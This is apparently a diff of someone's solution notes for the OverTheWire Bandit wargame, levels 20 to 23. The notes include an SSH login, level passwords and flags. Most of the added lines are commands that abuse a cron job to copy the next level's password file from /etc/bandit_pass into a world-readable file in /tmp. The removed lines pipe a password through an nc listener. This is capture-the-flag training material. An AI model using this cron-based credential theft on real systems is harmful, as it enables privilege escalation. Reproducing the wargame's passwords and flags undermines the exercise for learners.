@@ -11,14 +11,21 @@
 
 #
 # SSH
-ssh bandit20@bandit.labs.overthewire.org -p 2220
+ssh bandit23@bandit.labs.overthewire.org -p 2220
 
 # Password:
-# 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+# 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 
 # Code:
-# echo 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO | nc -lp 4444 &
-# ./suconnect 4444
+# cat /etc/cron.d/cronjob_bandit24
+# cat /usr/bin/cronjob_bandit24.sh
+# touch /tmp/darco/bandit24.sh
+# chmod 777 /tmp/darco/bandit24.sh
+# touch /tmp/darco/pass
+# chmod 666 /tmp/darco/pass
+# vi /tmp/darco/bandit24.sh
+# cat /etc/bandit_pass/bandit24 > /tmp/darco/pass
+# cat /tmp/darco/pass => (after wait a few seconds)
 
 # Flag:
-# EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+# gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
